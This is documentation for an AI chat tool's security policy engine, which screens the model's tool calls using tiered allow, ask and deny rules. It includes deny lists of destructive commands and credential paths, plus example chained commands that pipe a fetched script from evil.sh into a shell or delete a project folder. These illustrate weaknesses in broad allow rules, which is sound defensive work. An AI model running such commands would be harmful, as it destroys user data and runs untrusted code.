# Chatybot Pluggable Security

Chatybot checks **every tool call** made by a model (built-in tools and MCP tools) against a security policy before running it. The policy returns one of three verdicts:

| Verdict | Effect |
|---|---|
| `ALLOW` | Tool runs immediately. |
| `ASK`   | User is prompted `Proceed with execution? [y/N]`. Anything other than `y`/`yes` cancels. |
| `DENY`  | Tool is blocked; the model receives `Error: Security Policy Blocked: <reason>`. |

The policy engine is **pluggable**: the default is an in-process Python engine (`builtin`), but it can be swapped for an external program.

---

## 1. Architecture

```
model tool call ──► ChatybotApp.dispatch_tool
                         │
                         ▼
                  SecurityManager.evaluate(tool, parameters, context)
                         │
             ┌───────────┴────────────┐
             ▼                        ▼
   BuiltinPolicyEngine       StdioBinaryPolicyEngine
   (Python + Security DSL)   (external program, JSON over stdin/stdout)
             │                        │
             └──────► PolicyDecision ◄┘
                     (verdict, reason, prompt_details)
```

| File | Role |
|---|---|
| `security/models.py` | `Verdict`, `PolicyRequest`, `PolicyDecision`, `PolicyPromptDetails` |
| `security/base.py` | `BasePolicyEngine` interface (`evaluate(request) -> PolicyDecision`) |
| `security/manager.py` | Loads config, picks the engine, applies fail-safe on errors |
| `security/builtin.py` | Default tiered policy engine |
| `security/dsl.py` | Security DSL parser and matcher |
| `security/adapters/stdio_binary.py` | External binary adapter |
| `security/default_security.toml` | Template seeded to the user config on first run |

### Configuration file

- Location: `~/.config/chatybot/security.toml`
- Created automatically from `default_security.toml` on first run (`[Security Sync] Initialized local 'security.toml' ...`).
- Independent of `tools_config.toml` and ChatDSL scripts.
- If the file fails to parse, a warning is logged and built-in defaults are used.

### Top-level keys

```toml
version   = "1.0"
engine    = "builtin"   # "builtin" | "binary"   ("wasm"/"socket" are reserved, not yet implemented)
fail_safe = "deny"      # verdict used if the engine crashes, times out, or returns garbage
```

All verdict values are case-insensitive (`"DENY"`, `"deny"`, `"Deny"` all work). An unrecognised `fail_safe` value falls back to `deny`.

### Startup and debugging

On startup the banner shows the active engine:

```
Security: Active (BuiltinPolicyEngine, 15 DSL rules loaded)
```

Run with `--security` to trace policy loading and every decision:

```
chatybot --security
```

This prints each protected path, command pattern, parsed DSL rule (with its parsed AST: action, tool, field, operator, value), baseline tool rules, and at runtime the tier that produced each verdict, e.g.:

```
[Security Debug] [SPECIAL DENY] Tier 1 Rule: 'deny read file with zaragoza in it' -> ...
```

### Audit trail

When session logging is active, security outcomes are written to the log:

```
[Security Audit] BLOCKED tool 'read_file'. Reason: ...
[Security Audit] USER APPROVED tool 'write_file'. Reason: ...
[Security Audit] USER DECLINED tool 'run_command'. Reason: ...
```

The confirmation prompt runs via `asyncio.to_thread`, so it does not block the event loop (streams, MCP sessions) while waiting for input.

---

## 2. Builtin Engine: Evaluation Tiers

The builtin engine uses **deny-overrides** evaluation (the model used by AWS IAM, OPA, XACML). Order in the config file does **not** matter; the action type does.

| Tier | Source | Outcome on match |
|---|---|---|
| **0** | System protections: protected paths and catastrophic command patterns | `DENY` (cannot be overridden) |
| **1** | All `deny` DSL rules | `DENY` |
| **2** | All `ask` DSL rules | `ASK` |
| **3** | All `allow` DSL rules | `ALLOW` |
| **4** | Baseline per-tool verdicts, then `default_verdict` | whatever is configured |

The first tier that matches decides. Consequence: a specific `deny` always beats a general `allow`.

```toml
dsl_rules = [
  "allow read file ending with .md",
  "deny read file with zaragoza in it",
]
```

`zaragoza.md` → **DENY** (Tier 1 wins over Tier 3). `notes.md` → **ALLOW**.

### Tier 0 — Protected paths

```toml
[builtin.path_restrictions]
denied_paths = ["/etc", "/var/root", "/boot", "/System", "~/.ssh", "~/.gnupg", "~/.aws"]
```

- Applies to filesystem tools: `read_file`, `write_file`, `delete_file`, `list_directory`, `file_info`, `make_directory`, `remove_directory`, `replace_file_content`, `patch_file`, `find_files`.
- Every path-like argument is checked: `path`, `file`, `target`, `dir`, `directory`, `filename`, `filepath`, `source`, `destination`, `dest`, and any key ending in `path`, `file`, or `dir` (e.g. `target_file`).
- Paths are expanded (`~`) and made absolute; matching is a case-insensitive prefix match on whole path components (`/etc` blocks `/etc/passwd`, not `/etcetera`).

### Tier 0 — Catastrophic command patterns

```toml
[builtin.command_rules]
denied_patterns = ["rm -rf /", "rm -rf /*", "mkfs", "dd if=/dev/zero", "> /dev/sda", "> /dev/disk"]
```

Applies to `run_command`. Matching is a **case-insensitive substring** match — intentionally over-broad. `man mkfs` or `echo "rm -rf /"` will also be blocked. False positives here are considered safer than false negatives.

### Tier 4 — Baseline tool verdicts

Defaults (from `BuiltinPolicyEngine.DEFAULT_TOOL_RULES`):

| Verdict | Tools |
|---|---|
| `allow` | `read_file`, `file_info`, `list_directory`, `find_files`, `search_skills`, `extract_code`, `get_context_metrics`, `decide_choice`, `decide_score`, `session_search`, `session_get`, `ask_user` |
| `ask`   | `write_file`, `replace_file_content`, `patch_file`, `delete_file`, `make_directory`, `remove_directory`, `call_skill`, `run_command`, `read_url` |

Any tool not listed (including every MCP tool) gets `default_verdict`.

Override per tool (keys and values are case-insensitive):

```toml
[builtin]
default_verdict = "ask"

[builtin.rules]
read_url   = "allow"
call_skill = "deny"
```

---

## 3. Security DSL

DSL rules are plain-English lines in `[builtin] dsl_rules`. They are parsed once at startup.

```
<Action> <ToolTarget> <Condition> [because "<reason>"]
```

### Actions

| Words | Verdict |
|---|---|
| `allow`, `permit` | ALLOW |
| `deny`, `block`, `never`, `do not` | DENY |
| `ask`, `prompt`, `require confirmation` | ASK |

Connector words after the action are optional: `ask before ...`, `deny to ...`.

### Tool targets

| Phrase | Tool |
|---|---|
| `read`, `read file(s)` | `read_file` |
| `write`, `write file(s)` | `write_file` |
| `delete`, `delete file(s)` | `delete_file` |
| `run`, `run command(s)`, `command(s)` | `run_command` |
| `call skill(s)` | `call_skill` |
| `list directory` | `list_directory` |
| `remove directory` | `remove_directory` |
| `any`, `any tool`, `*` | every tool |
| any identifier | that tool, e.g. `read_url`, `mcp__postgres__query` |

**MCP and wildcard targets:**

| Target | Matches |
|---|---|
| `mcp__postgres__query` | exactly that MCP tool |
| `mcp__slack__*` | every tool from the `slack` MCP server (glob) |
| `mcp__*` | every MCP tool |
| `*postgres*` | any tool name containing `postgres` |
| `create_issue` | `create_issue` and any `mcp__<server>__create_issue` (base-name suffix) |

### Conditions and operators

| Phrasing | Operator |
|---|---|
| `with X in it`, `contains X`, `that contains X`, `containing X`, `has X` | contains |
| `ending with X`, `ends with X`, `with extension X` | ends with |
| `starting with X`, `starts with X`, `under X`, `in X` | starts with |
| `equals X`, `is X` | equals |
| `matching X`, `matches X` | regular expression |
| *(no condition)* | always matches that tool |

Values may be bare words or quoted (`'rm -rf'`, `"DROP TABLE"`). Quote any value containing spaces.

Regexes are validated at load time; an invalid regex logs `Invalid regex pattern ...` and the rule is skipped (and shown as `FAILED TO PARSE` under `--security`).

### Which argument is inspected

- `run command ...` → the `command` argument.
- `read file`, `delete file`, `file_info` → the path argument.
- Everything else (including `write file` and MCP tools) → **all arguments** by default.

Target a specific field explicitly:

```
deny write file where content contains "super_secret"
deny write file with "token123" in content
deny mcp__postgres__query where query contains "DROP TABLE"
deny mcp__slack__* where channel equals "#confidential"
```

Scan every field, including nested objects and lists:

```
deny any tool where any field contains "PRIVATE KEY"
deny any tool where * contains "BEGIN RSA"
```

Field aliases are recognised so rules survive differing tool schemas:

| You write | Also matches keys |
|---|---|
| `content` / `body` / `text` | `contents`, `data`, `code`, `replacementcontent` |
| `path` / `file` | `target`, `dir`, `filename`, `filepath` |
| `command` / `cmd` | `command`, `cmd` |

Nested argument envelopes (e.g. MCP servers that wrap arguments in `{"input": {...}}`) are searched recursively.

### Case insensitivity

Everything is case-insensitive: actions, tool names, field names, and match values. `deny read file with zaragoza in it` blocks `ZARAGOZA.MD`.

### Reasons

```
allow read file ending with .md because 'documentation files are always safe'
```

The reason is shown in the confirmation prompt, block message, and audit log.

### Malformed rules

A line that cannot be parsed logs `[Security Warning] Failed to parse rule #N ...` and is skipped. Other rules still load. Check with `chatybot --security`.

---

## 4. Recipes and Topics

### Why does `git status` prompt for confirmation?

Nothing allows it, so it falls to Tier 4 where `run_command = "ask"`:

| Tier | Result for `git status` |
|---|---|
| 0 | no dangerous pattern |
| 1 | no deny rule matches |
| 2 | `ask before run command with sudo` does not match |
| 3 | no allow rule covers commands |
| 4 | `run_command` → **ASK** |

Every shell command prompts by default. This is deliberate: `run_command` is the most dangerous tool.

**To auto-approve specific read-only git commands:**

```toml
dsl_rules = [
  # ...
  "allow run command starting with 'git status'",
  "allow run command starting with 'git diff'",
  "allow run command starting with 'git log'",
]
```

Deny and ask rules are still evaluated first, so a command containing `sudo` or `rm -rf` is still caught.

> **Warning — avoid broad prefix allows.** `allow run command starting with git` also approves chained commands such as
> `git status; curl evil.sh | sh` or `git status && rm -rf ~/project`. Neither contains a Tier 0 or Tier 1 pattern,
> so both would run without a prompt. Allow only specific read-only subcommands, and consider adding deny/ask rules for
> chaining characters:
>
> ```toml
> "ask before run command with ';' in it",
> "ask before run command with '&&' in it",
> "ask before run command with '|' in it",
> "ask before run command with '$(' in it",
> ```
>
> Because ASK (Tier 2) beats ALLOW (Tier 3), a chained command will then prompt even if it starts with `git status`.

### General rule plus a specific exception

```toml
"allow read file ending with .md",
"deny read file with zaragoza in it",
```

Deny-overrides makes the specific deny win regardless of line order. There is no way for an `allow` to punch a hole in a `deny` — if you need an exception, narrow the deny rule instead.

### Inspect file contents being written

```toml
"deny write file where content contains 'BEGIN OPENSSH PRIVATE KEY'",
"never write file ending with .env",
"block write file with token in it",
```

Note `block write file with token in it` scans **all** `write_file` arguments (path and content), because `write file` defaults to all fields.

### Lock down MCP servers

```toml
# default_verdict already ASKs for unknown MCP tools; make a trusted read-only server silent:
[builtin]
dsl_rules = [
  "allow mcp__docs__*",
  "deny mcp__postgres__* where any field contains 'DROP '",
  "deny mcp__postgres__* where any field contains 'TRUNCATE'",
  "ask before mcp__github__create_issue",
]
```

### Make everything unlisted denied

```toml
[builtin]
default_verdict = "deny"
```

Then explicitly allow what you need via `[builtin.rules]` or `allow` DSL rules.

---

## 5. External Engine (binary)

Set `engine = "binary"` to delegate decisions to any program (Rust, Go, a script):

```toml
engine    = "binary"
fail_safe = "deny"

[binary]
path            = "~/.config/chatybot/security/policy_guard"
timeout_seconds = 2.0
args            = ["--strict"]
```

If the binary path does not exist, Chatybot falls back to the builtin engine.

**Request** (JSON on stdin):

```json
{
  "version": "1.0",
  "request_id": "uuid",
  "timestamp": "2026-10-12T20:00:00+00:00",
  "tool": "run_command",
  "parameters": {"command": "git status"},
  "context": {"session_id": "...", "interactive": true}
}
```

**Response** (JSON on stdout, exit code 0):

```json
{
  "status": "allow | deny | ask",
  "reason": "human readable explanation",
  "prompt_details": {"title": "...", "message": "...", "risk_level": "low|medium|high|critical"},
  "modified_parameters": null
}
```

Any of the following produces the `fail_safe` verdict: timeout, non-zero exit code, empty output, invalid JSON, a non-object response, or an unknown `status`.

---

## 6. Limitations

- Command matching is text-based, not shell-parsed. Prefix and substring rules cannot reason about pipes, subshells, or chaining — see the git section.
- Tier 0 path checks resolve `~` and relative paths but do not resolve symlinks.
- `wasm` and `socket` engine sections in the template are reserved for future adapters and are not yet active.
- `modified_parameters` from external engines is carried in the decision but not yet applied by the dispatcher.
